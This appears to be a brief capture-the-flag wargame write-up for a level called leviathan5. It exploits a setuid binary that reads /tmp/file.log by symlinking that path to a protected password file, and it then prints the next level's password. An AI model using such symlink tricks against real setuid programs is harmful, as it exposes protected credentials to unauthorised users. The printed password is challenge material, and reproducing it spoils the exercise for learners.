# Overview
Home directory has a setuid binary `leviathan5`, owned by leviathan6. When run it says:
```
Cannot find /tmp/file.log
```

# File read
It looks like the binary just attempts to read `/tmp/file.log`. Let's create a symlink:
```
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
```

Then we get the password!

Password for the next level is `szo7HDB88w`.
